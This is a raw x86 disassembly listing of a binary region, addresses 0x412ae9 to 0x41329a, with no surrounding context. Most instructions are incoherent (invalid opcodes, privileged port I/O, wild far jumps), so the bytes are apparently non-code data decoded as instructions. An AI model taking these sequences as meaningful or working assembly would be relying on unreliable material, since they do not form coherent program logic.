  412ae9:	jl     0x412ab7
  412aeb:	jno    0x412b59
  412aed:	call   0x908b2ba7
  412af2:	inc    ebx
  412af3:	nop
  412af4:	sub    DWORD PTR [ecx],edi
  412af6:	and    BYTE PTR [edi+ebp*4-0x71],dh
  412afa:	mov    esi,DWORD PTR [eax]
  412afc:	out    dx,eax
  412afd:	and    eax,0xb3355304
  412b02:	mov    ebx,0x74c83f05
  412b07:	(bad)  
  412b08:	not    BYTE PTR [ebp+0xef53e04]
  412b0e:	jmp    0x5cb73c1
  412b13:	cmp    al,0x3f
  412b15:	out    dx,eax
  412b16:	jmp    0x412b1b
  412b1b:	add    BYTE PTR [edx-0x7c3abdc9],dl
  412b21:	aaa    
  412b22:	pop    edx
  412b23:	int    0xab
  412b25:	aaa    
  412b26:	dec    edx
  412b27:	lds    esi,FWORD PTR [ebx+0x37]
  412b2a:	(bad)  
  412b2b:	int    0xa7
  412b2d:	lods   eax,DWORD PTR ds:[esi]
  412b2e:	mov    bh,BYTE PTR [ebp+0x620eb292]
  412b34:	pop    esp
  412b35:	add    BYTE PTR [ebp-0x598feb],0x9e
  412b3c:	lahf   
  412b3d:	scas   al,BYTE PTR es:[edi]
  412b3e:	xor    DWORD PTR [ebp-0x527a6589],0xffffffaf
  412b45:	xchg   edx,eax
  412b46:	cmp    ebp,DWORD PTR [ecx]
  412b48:	shl    DWORD PTR ds:0x7ba80d4a,cl
  412b4e:	(bad)  
  412b4f:	mov    ebp,0xc54f7bc0
  412b54:	xchg   esp,eax
  412b55:	xor    edi,DWORD PTR [ecx-0x4d6c24]
  412b5b:	pop    esi
  412b5c:	nop
  412b5d:	sub    esi,DWORD PTR [edx-0x3b]
  412b60:	xchg   ebx,esi
  412b62:	call   FWORD PTR [esi+0x4f]
  412b65:	xchg   BYTE PTR [ebx+0xdeea74d],al
  412b6b:	jmp    0xc58bb103
  412b70:	jae    0x412b21
  412b72:	mov    ch,BYTE PTR [edi-0x63]
  412b75:	mov    dl,0xe
  412b77:	bound  esp,QWORD PTR [edi-0x6a]
  412b7a:	and    ch,BYTE PTR [ecx]
  412b7c:	popf   
  412b7d:	imul   BYTE PTR [edx]
  412b7f:	or     eax,0x0
  412b84:	add    BYTE PTR [edi-0x3],ah
  412b87:	outs   dx,DWORD PTR ds:[esi]
  412b88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b89:	mov    edi,0x4b64ff68
  412b8e:	pop    eax
  412b8f:	out    dx,eax
  412b90:	add    dh,dl
  412b92:	xor    eax,0xb68d2472
  412b97:	add    DWORD PTR [ebp+0xeb161],eax
  412b9d:	jb     0x412c14
  412b9f:	xchg   DWORD PTR [ebp+ecx*8-0x5f],eax
  412ba3:	xor    eax,0xb032e6ca
  412ba8:	add    BYTE PTR [ecx-0x3aa0ca4f],bh
  412bae:	mov    al,0x8d
  412bb0:	nop
  412bb1:	test   eax,0x7f0f0eb1
  412bb6:	mov    ch,0x85
  412bb8:	jl     0x412b97
  412bba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bbb:	add    DWORD PTR [esi-0x437a7653],esi
  412bc1:	(bad)  
  412bc2:	repnz out dx,eax
  412bc4:	jmp    FWORD PTR [ecx-0x66dbb572]
  412bca:	mov    edx,0x8c384308
  412bcf:	les    edi,FWORD PTR [eax+esi*4-0x43]
  412bd3:	and    BYTE PTR [ecx+ebp*1],0xb6
  412bd7:	push   cs
  412bd8:	add    dl,dh
  412bda:	jmp    0x282a:0xc2fa102a
  412be1:	imul   esi,DWORD PTR [eax+0x418e688b],0x3bf1
  412beb:	add    BYTE PTR [eax],al
  412bed:	add    BYTE PTR [ecx+0x3f138cb1],al
  412bf3:	mov    cl,0xe
  412bf5:	mov    ebp,DWORD PTR [ebp+0x2901528a]
  412bfb:	mov    cl,0x4e
  412bfd:	mov    ebp,edi
  412bff:	xchg   esp,eax
  412c00:	cmp    dl,BYTE PTR [eax-0x1]
  412c03:	aas    
  412c04:	mov    edx,0xeb7d524
  412c09:	add    BYTE PTR [edx-0x6f4b0ea6],ah
  412c0f:	scas   eax,DWORD PTR es:[edi]
  412c10:	pop    esi
  412c11:	inc    DWORD PTR [edi]
  412c13:	dec    ebx
  412c14:	push   esp
  412c15:	std    
  412c16:	inc    esp
  412c17:	scas   eax,DWORD PTR es:[edi]
  412c18:	pop    esi
  412c19:	push   edi
  412c1b:	dec    edx
  412c1c:	cld    
  412c1d:	mov    ah,0xb4
  412c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c20:	or     DWORD PTR [eax],eax
  412c22:	nop
  412c23:	call   0xfde5:0xe5e8c96f
  412c2a:	xlat   BYTE PTR ds:[ebx]
  412c2b:	aad    0xcb
  412c2d:	or     eax,0xfff1e315
  412c32:	(bad)  
  412c33:	iret   
  412c34:	outs   dx,DWORD PTR ds:[esi]
  412c35:	and    al,0x50
  412c37:	dec    edx
  412c38:	or     eax,DWORD PTR [eax]
  412c3a:	or     edx,DWORD PTR [edi+0x5b3426]
  412c40:	aas    
  412c41:	and    al,0x80
  412c43:	cmp    BYTE PTR [esi+0xb3ddfe7],bh
  412c49:	add    BYTE PTR [ebx],dl
  412c4b:	pop    esp
  412c4c:	pop    edi
  412c4d:	add    BYTE PTR [ebx],bl
  412c4f:	(bad)  
  412c50:	daa    
  412c51:	inc    eax
  412c52:	add    BYTE PTR [eax],al
  412c54:	add    BYTE PTR [eax],al
  412c56:	add    BYTE PTR [ecx+0x8740b49],dl
  412c5c:	mov    cl,0xc1
  412c5e:	jbe    0x412c6c
  412c60:	cmp    ebx,ecx
  412c62:	inc    eax
  412c63:	sbb    DWORD PTR ds:0xdcf373f,ecx
  412c69:	or     al,0x8e
  412c6b:	in     eax,0x94
  412c6d:	cld    
  412c6e:	std    
  412c6f:	imul   esi,DWORD PTR [edx-0xa],0x6fd14ffd
  412c76:	and    al,0xd0
  412c78:	dec    edx
  412c79:	or     eax,DWORD PTR [eax]
  412c7b:	sub    DWORD PTR [edx],esp
  412c7d:	cld    
  412c7e:	std    
  412c7f:	aaa    
  412c80:	stc    
  412c81:	retf   0x1940
  412c84:	push   cs
  412c85:	daa    
  412c86:	adc    al,0x6b
  412c88:	xchg   ecx,eax
  412c89:	pop    edi
  412c8a:	and    al,0x5b
  412c8c:	mov    dl,0x48
  412c8e:	pusha  
  412c8f:	test   DWORD PTR [edi],ebp
  412c91:	popa   
  412c92:	add    BYTE PTR [eax-0x6e46174e],dl
  412c98:	out    dx,eax
  412c99:	push   ds
  412c9a:	dec    eax
  412c9b:	mov    ah,0x92
  412c9d:	clc    
  412c9e:	xchg   DWORD PTR [ebp+eiz*4-0x1b],esp
  412ca2:	add    ebx,DWORD PTR [ecx]
  412ca4:	test   DWORD PTR [ecx],0x29295018
  412caa:	sub    BYTE PTR [edi+esi*2+0x77b472a6],al
  412cb1:	mov    ebx,0x7f1e1401
  412cb6:	icebp  
  412cb7:	lds    ebp,FWORD PTR [edi]
  412cb9:	add    DWORD PTR [eax],ebp
  412cbb:	add    BYTE PTR [eax],al
  412cbd:	add    BYTE PTR [eax],al
  412cbf:	add    BYTE PTR [edx+esi*4-0x8],dh
  412cc3:	xchg   BYTE PTR [edi+0x1903e5ab],bl
  412cc9:	jo     0x412d39
  412ccb:	dec    eax
  412ccc:	ins    BYTE PTR es:[edi],dx
  412ccd:	mov    ds:0x2d8dbdbc,al
  412cd2:	cwde   
  412cd3:	add    al,0x90
  412cd5:	mov    dl,0x2c
  412cd7:	push   ecx
  412cd8:	cld    
  412cd9:	stos   DWORD PTR es:[edi],eax
  412cda:	adc    DWORD PTR fs:[eax+0x4600e5b2],0xffffffaf
  412ce2:	push   cs
  412ce3:	dec    eax
  412ce4:	lods   al,BYTE PTR ds:[esi]
  412ce5:	xchg   edx,eax
  412ce6:	mov    ecx,0xfcf1d109
  412ceb:	mov    ebp,0x806c4ae4
  412cf0:	mov    ah,0xf2
  412cf2:	out    0x3,al
  412cf4:	nop
  412cf5:	daa    
  412cf6:	test   eax,0x992fa027
  412cfb:	daa    
  412cfc:	js     0x412cb0
  412cfe:	rol    BYTE PTR [esi-0xef7ab25],1
  412d04:	jns    0x412d60
  412d06:	loopne 0x412c8d
  412d08:	cwde   
  412d09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d0a:	push   cs
  412d0b:	jmp    0xc5cb56a3
  412d10:	iret   
  412d11:	cmp    ebp,edi
  412d13:	jmp    0x58b60eb
  412d18:	enter  0x58e2,0xd6
  412d1c:	aas    
  412d1d:	xchg   esi,eax
  412d1e:	push   edx
  412d1f:	call   0x9cc4dfb7
  412d24:	add    BYTE PTR [eax],al
  412d26:	add    BYTE PTR [eax],al
  412d28:	add    BYTE PTR [eax],al
  412d2a:	push   es
  412d2b:	sub    bl,BYTE PTR ds:0x1e0eb293
  412d31:	loope  0x412d38
  412d33:	sub    cl,BYTE PTR ds:0xa60eb293
  412d39:	pop    ds
  412d3a:	xchg   esi,eax
  412d3b:	push   edx
  412d3c:	call   0x629edfd4
  412d41:	add    al,0x4a
  412d43:	lods   al,BYTE PTR ds:[esi]
  412d44:	test   al,al
  412d46:	cmp    al,0x89
  412d48:	test   eax,0xf0a12f90
  412d4d:	xchg   ebx,eax
  412d4e:	mov    dl,0x83
  412d50:	outs   dx,DWORD PTR gs:[esi]
  412d52:	repnz or eax,0x4a2993e9
  412d58:	or     eax,0xbd33e958
  412d5d:	mov    bh,0xa2
  412d5f:	jnp    0x412cf5
  412d61:	push   0xffffffff
  412d63:	sbb    ecx,ebp
  412d65:	xchg   ebx,eax
  412d66:	xor    ebp,DWORD PTR [edi-0x3b]
  412d69:	xchg   ebx,eax
  412d6a:	sub    eax,DWORD PTR [edx-0x10c62bfb]
  412d70:	jmp    0x10745854
  412d75:	fldcw  WORD PTR [esi]
  412d77:	cmp    ebp,DWORD PTR [ecx]
  412d79:	shl    DWORD PTR [ecx],cl
  412d7b:	inc    edi
  412d7c:	mov    ebp,0xe672ef7a
  412d81:	adc    esi,eax
  412d83:	out    dx,eax
  412d84:	push   cs
  412d85:	inc    eax
  412d86:	push   edx
  412d87:	inc    ecx
  412d88:	add    BYTE PTR ds:0x8bf14a,dh
  412d8e:	add    BYTE PTR [eax],al
  412d90:	add    BYTE PTR [eax],al
  412d92:	mov    ebp,0x39014e91
  412d97:	mov    dh,0xe7
  412d99:	push   0xff14a2e
  412d9e:	neg    ebx
  412da0:	out    dx,eax
  412da1:	push   cs
  412da2:	daa    
  412da3:	in     al,dx
  412da4:	or     al,0xc1
  412da6:	(bad)  [esi]
  412da8:	push   es
  412da9:	rcr    BYTE PTR [edx-0x7aab7892],1
  412daf:	mov    cs,WORD PTR [esi-0x77]
  412db2:	mov    ch,0x8a
  412db4:	sub    al,BYTE PTR [ebx-0x771849cc]
  412dba:	jmp    0x37503c74
  412dbf:	jmp    0x412db0
  412dc1:	rcr    BYTE PTR [ecx],0x37
  412dc4:	mov    BYTE PTR [ebp+edx*8-0x6b],al
  412dc8:	add    DWORD PTR [esi+0x4407b474],esi
  412dce:	lds    edx,FWORD PTR [ebp-0x3dc63fc3]
  412dd4:	sub    dh,BYTE PTR [ebx]
  412dd6:	jns    0x412d95
  412dd8:	fmul   DWORD PTR [edi]
  412dda:	inc    ebp
  412ddb:	outs   dx,BYTE PTR ds:[esi]
  412ddc:	in     eax,0xd3
  412dde:	jp     0x412e4e
  412de0:	dec    esi
  412de1:	mov    eax,edi
  412de3:	mov    bh,0x4a
  412de5:	and    al,0x91
  412de7:	push   es
  412de8:	icebp  
  412de9:	dec    esi
  412deb:	leave  
  412dec:	dec    ebx
  412ded:	jmp    0x412e0a
  412def:	test   dh,cl
  412df1:	inc    eax
  412df2:	loop   0x412e52
  412df4:	in     eax,0xed
  412df6:	add    BYTE PTR [eax],al
  412df8:	add    BYTE PTR [eax],al
  412dfa:	add    BYTE PTR [edx+0x75],ch
  412dfd:	dec    esi
  412dfe:	mov    DWORD PTR ds:0x978b2691,esi
  412e04:	pop    ebp
  412e05:	in     eax,0x33
  412e07:	jns    0x412df7
  412e09:	xchg   DWORD PTR [eax+edx*4+0x67],eax
  412e0d:	adc    ecx,DWORD PTR ds:0xbf0a0e06
  412e13:	xor    BYTE PTR [ebx+0x72],al
  412e16:	inc    esp
  412e17:	je     0x412e84
  412e19:	lock mov ch,0xcd
  412e1c:	dec    ebp
  412e1d:	repnz inc ebx
  412e1f:	je     0x412e8c
  412e21:	je     0x412df9
  412e23:	sub    edi,DWORD PTR [ecx-0x3c28bd72]
  412e29:	fild   DWORD PTR [ecx+0x547249f2]
  412e2f:	mov    ah,0xaf
  412e31:	out    dx,eax
  412e32:	mov    ebp,0x40306b20
  412e37:	nop
  412e38:	dec    eax
  412e39:	mov    eax,ds:0x4a8ff880
  412e3e:	add    BYTE PTR [ebp-0x32],dl
  412e41:	retf   
  412e42:	or     eax,0x3c26874c
  412e47:	sbb    DWORD PTR [edi-0x2668dfda],ecx
  412e4d:	inc    esi
  412e4e:	add    BYTE PTR [ebp-0x2e],dl
  412e51:	push   edi
  412e52:	and    al,0xa0
  412e54:	ret    0x2447
  412e57:	mov    dl,al
  412e59:	dec    edi
  412e5a:	and    al,0x84
  412e5c:	(bad)  
  412e5d:	fisttp QWORD PTR ds:0x0
  412e63:	add    BYTE PTR [esi],cl
  412e65:	int3   
  412e66:	or     al,0x0
  412e68:	nop
  412e69:	int3   
  412e6a:	retf   
  412e6b:	cli    
  412e6c:	adc    edx,edx
  412e6e:	lock or al,0xf
  412e71:	(bad)  [esi]
  412e73:	add    BYTE PTR [eax+0x2d8327e8],dl
  412e79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e7a:	dec    ecx
  412e7b:	add    BYTE PTR [ebx+0x40394b89],ah
  412e81:	push   ecx
  412e82:	outs   dx,DWORD PTR ds:[esi]
  412e83:	pop    edi
  412e84:	xchg   ebx,eax
  412e85:	dec    ecx
  412e86:	or     eax,DWORD PTR [edi+0x17c1b2cc]
  412e8c:	sbb    eax,ebp
  412e8e:	sub    DWORD PTR [edx],0xa664a85f
  412e94:	mov    dh,BYTE PTR [edx-0x654a7d1b]
  412e9a:	in     eax,0x77
  412e9c:	mov    gs,WORD PTR [ebx]
  412e9e:	cwde   
  412e9f:	or     edi,DWORD PTR [esi-0x3ff05fdb]
  412ea5:	loope  0x412f13
  412ea7:	mov    edx,0x2239a28
  412eac:	nop
  412ead:	sub    eax,0xc012fda5
  412eb2:	hlt    
  412eb3:	add    edx,DWORD PTR [eax-0x5fd7c6d5]
  412eb9:	dec    ebx
  412eba:	call   FWORD PTR [eax]
  412ebc:	pop    ebp
  412ebd:	xchg   esi,eax
  412ebe:	or     al,0xcb
  412ec0:	pop    ebp
  412ec1:	xchg   edi,eax
  412ec2:	imul   eax,DWORD PTR [ecx],0xffffff9a
  412ec5:	out    dx,eax
  412ec6:	icebp  
  412ec7:	jbe    0x412ec9
  412ec9:	add    BYTE PTR [eax],al
  412ecb:	add    BYTE PTR [eax],al
  412ecd:	js     0x412e52
  412ecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ed0:	inc    esp
  412ed1:	xchg   edi,ebp
  412ed3:	icebp  
  412ed4:	cld    
  412ed5:	adc    esp,eax
  412ed7:	hlt    
  412ed8:	add    edx,DWORD PTR [eax+0x7a03242c]
  412ede:	out    dx,eax
  412edf:	(bad)  
  412ee1:	adc    ebp,esp
  412ee3:	aam    0x3
  412ee5:	nop
  412ee6:	sub    ebp,DWORD PTR [ecx]
  412ee8:	sub    BYTE PTR [ebx+esi*8-0x71bb84da],al
  412eef:	icebp  
  412ef0:	sub    BYTE PTR [edx-0x48],bl
  412ef3:	jb     0x412ed0
  412ef5:	xor    DWORD PTR [ebp+eiz*8-0x4e10f6fd],0x18
  412efd:	push   edx
  412efe:	jnp    0x412f2d
  412f00:	std    
  412f01:	adc    al,0x8a
  412f03:	xor    al,0xed
  412f05:	gs mov bl,0xe
  412f08:	adc    edi,DWORD PTR [ebx]
  412f0a:	push   edi
  412f0b:	or     al,0xe9
  412f0d:	xchg   ebx,eax
  412f0e:	or     esi,0x2aeecaa9
  412f14:	cmc    
  412f15:	js     0x412f79
  412f17:	jmp    DWORD PTR [edx+eiz*2-0x4c]
  412f1b:	push   cs
  412f1c:	jmp    0xf6a40489
  412f21:	adc    BYTE PTR [edi-0x5acb0105],ch
  412f27:	mov    eax,0xf631d0ea
  412f2c:	jecxz  0x412ecd
  412f2e:	mov    ?,edi
  412f30:	jbe    0x412f32
  412f32:	add    BYTE PTR [eax],al
  412f34:	add    BYTE PTR [eax],al
  412f36:	(bad)  
  412f37:	mov    ds:0x3a10e90e,eax
  412f3c:	add    dl,BYTE PTR [edi-0x5c]
  412f3f:	xor    esi,esi
  412f41:	fdivr  QWORD PTR [edi-0x70]
  412f44:	xor    DWORD PTR [ebx+edx*4-0x4e],ebp
  412f48:	push   cs
  412f49:	out    dx,al
  412f4a:	push   cs
  412f4b:	dec    edx
  412f4c:	sbb    al,0xe9
  412f4e:	xchg   ebx,eax
  412f4f:	jg     0x412fc8
  412f51:	dec    ecx
  412f52:	aad    0x33
  412f54:	iret   
  412f55:	sti    
  412f56:	xchg   ebx,eax
  412f57:	mov    dl,0x83
  412f59:	and    eax,0x604e9e78
  412f5e:	push   edi
  412f5f:	mov    ds,WORD PTR [edx]
  412f61:	rcl    cl,cl
  412f63:	mov    bh,0xb1
  412f65:	nop
  412f66:	sub    DWORD PTR [esi+ecx*1+0x62d578e9],esi
  412f6d:	cli    
  412f6e:	mov    edx,0x1ee33331
  412f73:	dec    esi
  412f74:	dec    ebx
  412f75:	push   edx
  412f76:	jb     0x412efc
  412f78:	into   
  412f79:	test   eax,0xfd2aef0a
  412f7e:	test   al,0x62
  412f80:	call   FWORD PTR [ebp+edx*8-0x50]
  412f84:	push   cs
  412f85:	add    BYTE PTR [ecx-0x75],bh
  412f88:	push   ecx
  412f89:	ins    BYTE PTR es:[edi],dx
  412f8a:	jbe    0x412fbf
  412f8c:	stos   DWORD PTR es:[edi],eax
  412f8d:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f8f:	inc    esi
  412f90:	add    DWORD PTR [esi-0x7720c96],esi
  412f96:	inc    eax
  412f97:	aaa    
  412f98:	mov    ebx,DWORD PTR [ebx+0x0]
  412f9e:	add    BYTE PTR [ebx-0x4e],cl
  412fa1:	push   cs
  412fa2:	and    DWORD PTR [ecx-0x447bfe6f],0xffffffa3
  412fa9:	push   cs
  412faa:	add    BYTE PTR [edx+edx*1+0xe],dl
  412fae:	add    BYTE PTR [ecx],bh
  412fb0:	aaa    
  412fb1:	mov    eax,DWORD PTR [edi-0x74f14dc5]
  412fb7:	in     eax,dx
  412fb8:	lea    ebx,[edx]
  412fba:	inc    eax
  412fbb:	xor    dl,0x2a
  412fbe:	adc    al,0xb2
  412fc0:	ins    BYTE PTR es:[edi],dx
  412fc1:	jo     0x412f8c
  412fc3:	sar    BYTE PTR [esp+ecx*1+0x0],1
  412fc7:	jmp    0x6081fe48
  412fcc:	repnz sub dl,BYTE PTR [edx+edx*4]
  412fd0:	pop    esi
  412fd1:	add    DWORD PTR [edx+ecx*4-0x1dfff154],ecx
  412fd8:	call   0xe47b3f3f
  412fdd:	cld    
  412fde:	jmp    DWORD PTR [esi]
  412fe0:	cmp    bh,BYTE PTR [ecx-0x9d295fd]
  412fe6:	or     DWORD PTR [ebp-0x26077262],ebx
  412fec:	lds    eax,FWORD PTR ds:0xeae593d
  412ff2:	add    BYTE PTR [esi-0x56edb5ce],dh
  412ff8:	mov    cl,0x85
  412ffa:	inc    esp
  412ffb:	popf   
  412ffc:	mov    ds:0x952d894e,al
  413001:	sbb    bh,BYTE PTR [ebx]
  413003:	add    BYTE PTR [eax],al
  413005:	add    BYTE PTR [eax],al
  413007:	add    BYTE PTR [eax+0x69cf6489],dl
  41300d:	je     0x413018
  41300f:	add    BYTE PTR [eax+0x1940cb38],dl
  413015:	(bad)  
  413016:	unpcklps xmm3,XMMWORD PTR [ebx+0x708bf39b]
  41301d:	dec    edx
  41301e:	or     eax,DWORD PTR [eax]
  413020:	mov    ebp,DWORD PTR [edi+edx*2+0xd]
  413024:	adc    edi,DWORD PTR [ecx+edi*8]
  413027:	std    
  413028:	aas    
  413029:	dec    esp
  41302a:	mov    ebp,0xe2c8d301
  41302f:	or     ch,BYTE PTR [edi+edx*2+0x4495f888]
  413036:	jne    0x413040
  413038:	or     BYTE PTR [ebx+0xb],0x3b
  41303c:	or     eax,0x9f000b4b
  413041:	(bad)  
  413042:	out    0xf,al
  413044:	nop
  413045:	dec    ebx
  413046:	jo     0x41308c
  413048:	mov    ah,0x37
  41304a:	dec    ebx
  41304b:	xchg   DWORD PTR [edi+ebp*4+0x1e],ecx
  41304f:	cmp    edx,edx
  413051:	in     al,dx
  413052:	mov    ch,0xe7
  413054:	cmp    BYTE PTR [edx+0xb],cl
  413057:	add    BYTE PTR [ebx+0x4c874b0b],ah
  41305d:	scas   eax,DWORD PTR es:[edi]
  41305e:	push   ds
  41305f:	cmp    eax,esp
  413061:	cmp    esi,DWORD PTR [edi-0x69]
  413064:	xchg   ecx,eax
  413065:	dec    ebx
  413066:	or     edi,DWORD PTR [ecx]
  413068:	pop    edi
  413069:	scas   eax,DWORD PTR es:[edi]
  41306a:	repz add BYTE PTR [eax],0x0
  41306e:	add    BYTE PTR [eax],al
  413070:	add    al,ah
  413072:	sbb    esp,esp
  413074:	std    
  413075:	lahf   
  413076:	jne    0x413080
  413078:	inc    ecx
  413079:	adc    esi,DWORD PTR [ebx]
  41307b:	icebp  
  41307c:	or     al,0xc
  41307e:	add    eax,0xc890001a
  413083:	jecxz  0x413090
  413085:	push   cs
  413086:	mov    bl,0xfc
  413088:	sub    BYTE PTR [ebx],dl
  41308a:	mov    bl,0xe5
  41308c:	add    ecx,DWORD PTR [ebp-0x6feb70d3]
  413092:	mov    dl,0x6c
  413094:	aas    
  413095:	mov    ah,0x9e
  413097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413098:	jl     0x413066
  41309a:	mov    ds,ecx
  41309c:	cs push edx
  41309e:	mov    ch,0x2a
  4130a0:	fdiv   QWORD PTR [edi-0x7efc1a4f]
  4130a6:	jb     0x41304d
  4130a8:	jl     0x413076
  4130aa:	mov    ?,ecx
  4130ac:	cs pusha 
  4130ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130af:	imul   edx,DWORD PTR [ebp+0x37],0xcd2ee534
  4130b6:	xabort 0x86
  4130b9:	push   es
  4130ba:	stos   DWORD PTR es:[edi],eax
  4130bb:	in     eax,0x3
  4130bd:	(bad)  
  4130be:	cld    
  4130bf:	jmp    0x41313f
  4130c1:	int    0x7e
  4130c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130c4:	jge    0x41305a
  4130c6:	mov    cl,0x1
  4130c8:	add    BYTE PTR [ebp-0x6fec94d3],dl
  4130ce:	mov    dl,0x6c
  4130d0:	inc    eax
  4130d1:	lods   al,BYTE PTR ds:[esi]
  4130d2:	sahf   
  4130d3:	and    eax,0x7b
  4130d8:	add    BYTE PTR [eax],al
  4130da:	push   esp
  4130db:	mov    ss,ecx
  4130dd:	sub    al,0xd2
  4130df:	mov    ah,0xad
  4130e1:	(bad)  [ebx-0x5efc1a4f]
  4130e7:	jb     0x41310e
  4130e9:	jnp    0x41313f
  4130eb:	mov    ?,ecx
  4130ed:	sub    al,0xe0
  4130ef:	mov    ds:0x33bf1261,eax
  4130f4:	in     eax,0x2c
  4130f6:	push   ebp
  4130f7:	(bad)  
  4130f8:	rol    BYTE PTR [edx+esi*1-0x6afc1a56],1
  4130ff:	cld    
  413100:	sti    
  413101:	jl     0x413158
  413103:	jle    0x413113
  413105:	sub    dl,BYTE PTR [esi]
  413107:	scas   al,BYTE PTR es:[edi]
  413108:	or     eax,0x8aa68fc5
  41310d:	daa    
  41310e:	mov    ds:0xd0720eb2,eax
  413113:	mov    ds,WORD PTR [edx]
  413115:	test   eax,0xf52aeefa
  41311a:	mov    esp,0x4b217070
  41311f:	dec    ebx
  413120:	push   cs
  413121:	jmp    0xaa0fb2b9
  413126:	(bad)  
  413128:	sub    dl,ch
  41312a:	jl     0x41318e
  41312c:	push   DWORD PTR [esi+edx*2-0x4e]
  413130:	push   cs
  413131:	jmp    0xd28e9cba
  413136:	enter  0xffc6,0x69
  41313a:	or     BYTE PTR [edx-0x11],al
  41313d:	push   es
  41313e:	add    BYTE PTR [eax],al
  413140:	add    BYTE PTR [eax],al
  413142:	add    BYTE PTR [ecx],ch
  413144:	std    
  413145:	add    dh,BYTE PTR [edx-0x2f]
  413148:	jle    0x4130ce
  41314a:	in     eax,dx
  41314b:	xchg   edx,eax
  41314c:	add    ebp,0xcd9054a8
  413152:	test   BYTE PTR [esi-0x6c16e1ca],0x29
  413159:	dec    edx
  41315a:	or     eax,0x2585f2a0
  41315f:	mov    al,0x9e
  413161:	xor    ebp,DWORD PTR [ebx-0x791aa087]
  413167:	xchg   ebx,eax
  413168:	mov    dl,0xe
  41316a:	cli    
  41316b:	shl    ecx,cl
  41316d:	test   DWORD PTR ds:0xb9339e70,esp
  413173:	enter  0x9626,0xe9
  413177:	xchg   ebx,eax
  413178:	mov    dl,0x3b
  41317a:	mov    al,ds:0xfd4f7952
  41317f:	test   al,0x31
  413181:	add    BYTE PTR fs:[ecx],ch
  413184:	dec    edx
  413185:	icebp  
  413186:	packuswb mm6,QWORD PTR [esi]
  413189:	xchg   BYTE PTR [edi-0x2b],al
  41318c:	mov    ah,0xa
  41318e:	add    DWORD PTR [edx+0x6d],ecx
  413191:	das    
  413192:	inc    ebx
  413193:	fwait
  413194:	cmc    
  413195:	add    BYTE PTR [ebx+esi*1-0xdfff13a],al
  41319c:	icebp  
  41319d:	sub    dl,BYTE PTR [ecx+edi*1]
  4131a0:	lods   eax,DWORD PTR ds:[esi]
  4131a1:	dec    edx
  4131a2:	and    al,0x45
  4131a4:	(bad)  
  4131a6:	jle    0x4131a8
  4131a8:	add    BYTE PTR [eax],al
  4131aa:	add    BYTE PTR [eax],al
  4131ac:	test   BYTE PTR [esi],cl
  4131ae:	xor    bp,WORD PTR [ecx-0x6abb788b]
  4131b5:	ret    0xd035
  4131b8:	in     eax,dx
  4131b9:	js     0x4131f0
  4131bb:	pop    edi
  4131bc:	or     eax,0x26a98e2b
  4131c1:	mov    dh,0xe
  4131c3:	xsaves [esi]
  4131c6:	xchg   BYTE PTR [edi-0x1b],al
  4131c9:	jbe    0x41314f
  4131cb:	add    al,0x28
  4131cd:	rcr    BYTE PTR [esi],cl
  4131cf:	shld   DWORD PTR [eax-0x5106ffe2],esi,0x4a
  4131d7:	and    al,0x5
  4131d9:	jbe    0x413162
  4131db:	inc    esp
  4131dc:	xchg   ebp,eax
  4131dd:	ret    0xc235
  4131e0:	pop    edi
  4131e1:	(bad)  
  4131e2:	in     al,0x33
  4131e4:	mov    dh,dh
  4131e6:	dec    ebp
  4131e7:	mov    DWORD PTR [ebp-0x6c4e52e],esi
  4131ed:	call   0x8301:0x8a7e3b26
  4131f4:	test   DWORD PTR [ecx],esi
  4131f6:	out    dx,eax
  4131f7:	(bad)  
  4131f8:	mov    esi,0x768b055f
  4131fd:	loop   0x41324c
  4131ff:	mov    dl,BYTE PTR [eax-0x7fdbf5e1]
  413205:	adc    BYTE PTR [edi+0x50],ch
  413208:	sbb    BYTE PTR [ebx],0xb
  41320b:	mov    DWORD PTR [edi+esi*8-0x2],edx
  41320f:	aas    
  413210:	add    BYTE PTR [eax],al
  413212:	add    BYTE PTR [eax],al
  413214:	add    BYTE PTR [ecx],cl
  413216:	loopne 0x413246
  413218:	adc    al,0xcb
  41321a:	pop    ebp
  41321b:	push   0xf5f1bd8
  413220:	sbb    BYTE PTR [ebx],cl
  413222:	lahf   
  413223:	cs inc eax
  413225:	xchg   ecx,eax
  413226:	sbb    ecx,DWORD PTR [ebx]
  413228:	cmp    esp,eax
  41322a:	mov    bh,0x2a
  41322c:	or     eax,0xfde9f40c
  413231:	pop    edi
  413232:	pushf  
  413233:	data16 and al,0xac
  413236:	sbb    edi,eax
  413238:	cmp    BYTE PTR [ebx+0x13000b15],0xdb
  41323f:	in     al,0x87
  413241:	fdivr  st(7),st
  413243:	inc    BYTE PTR [eax-0x7b07e7c8]
  413249:	les    edx,FWORD PTR ds:0xff27000b
  41324f:	(bad)  
  413250:	jecxz  0x4132bc
  413252:	pop    edx
  413253:	or     ecx,DWORD PTR [ecx-0x28dbc839]
  413259:	lahf   
  41325a:	pushf  
  41325b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41325c:	add    BYTE PTR [eax-0x678273e5],dl
  413262:	sbb    ebx,DWORD PTR [edi+0x1a]
  413265:	or     esi,eax
  413267:	add    dl,BYTE PTR [esi+0x1d]
  41326a:	fadd   DWORD PTR [esi]
  41326c:	push   eax
  41326d:	inc    ecx
  41326e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41326f:	mov    ah,0xe8
  413271:	adc    eax,0xd000d31
  413276:	pop    ebx
  413277:	jle    0x4132a9
  413279:	add    BYTE PTR [eax],al
  41327b:	add    BYTE PTR [eax],al
  41327d:	add    BYTE PTR [ebx],bl
  41327f:	(bad)  
  413280:	adc    BYTE PTR cs:[ebx+0x4d1b07b1],bh
  413287:	into   
  413288:	in     al,dx
  413289:	int3   
  41328a:	cmp    eax,0x6a026bc9
  41328f:	jns    0x413242
  413291:	jo     0x413213
  413293:	in     eax,0xa5
  413295:	inc    ebx
  413296:	addr16 jns 0x41326a
  413299:	outs   dx,DWORD PTR ds:[esi]
  41329a:	jl     0x4132d8
